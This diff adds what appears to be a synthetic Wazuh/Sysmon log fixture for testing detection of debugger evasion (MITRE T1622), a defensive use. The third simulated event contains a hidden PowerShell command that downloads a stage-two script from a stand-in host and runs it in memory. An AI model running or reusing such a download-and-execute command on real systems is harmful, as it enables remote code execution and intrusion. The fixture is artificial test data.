@@ -1,0 +1,232 @@
+{
+  "_metadata": {
+    "attack_id": "T1622",
+    "variation": "001",
+    "name": "Debugger Evasion - Anti-Debug Checks",
+    "description": "Using IsDebuggerPresent and NtQueryInformationProcess to detect and evade debuggers",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "defense-evasion",
+    "tactic": "Defense Evasion",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Process with IsDebuggerPresent call",
+      "sequence": 1,
+      "timestamp": "2026-02-10T20:28:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:28:00.000Z",
+        "rule": {
+          "level": 11,
+          "description": "Sysmon - Event 1: Process execution with anti-debug checks (IsDebuggerPresent)",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1622"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Debugger Evasion"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600480.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 20:28:00.000",
+              "processGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345708}",
+              "processId": "8124",
+              "image": "C:\\Users\\Public\\malware.exe",
+              "commandLine": "C:\\Users\\Public\\malware.exe",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=MALWARE_HASH_WITH_ANTI_DEBUG",
+              "parentProcessGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345670}",
+              "parentProcessId": "3248",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 10 - NtQueryInformationProcess call",
+      "sequence": 2,
+      "timestamp": "2026-02-10T20:28:15.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:28:15.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 10: Process querying own debug status (NtQueryInformationProcess)",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1622"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Debugger Evasion"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event10",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600495.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "10",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "10",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 20:28:15.000",
+              "sourceProcessGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345708}",
+              "sourceProcessId": "8124",
+              "sourceImage": "C:\\Users\\Public\\malware.exe",
+              "targetProcessGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345708}",
+              "targetProcessId": "8124",
+              "targetImage": "C:\\Users\\Public\\malware.exe",
+              "grantedAccess": "0x1400",
+              "callTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4f4|C:\\Users\\Public\\malware.exe+1a20",
+              "sourceUser": "CORP\\attacker",
+              "targetUser": "CORP\\attacker"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Conditional execution based on debug status",
+      "sequence": 3,
+      "timestamp": "2026-02-10T20:28:30.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:28:30.000Z",
+        "rule": {
+          "level": 13,
+          "description": "Sysmon - Event 1: Malware executing conditional payload after anti-debug checks",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1622",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Defense Evasion",
+              "Execution"
+            ],
+            "technique": [
+              "Debugger Evasion",
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600510.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 20:28:30.000",
+              "processGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345709}",
+              "processId": "8324",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.110/stage2.ps1')\"",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=4E5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A",
+              "parentProcessGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345708}",
+              "parentProcessId": "8124",
+              "parentImage": "C:\\Users\\Public\\malware.exe",
+              "parentCommandLine": "C:\\Users\\Public\\malware.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
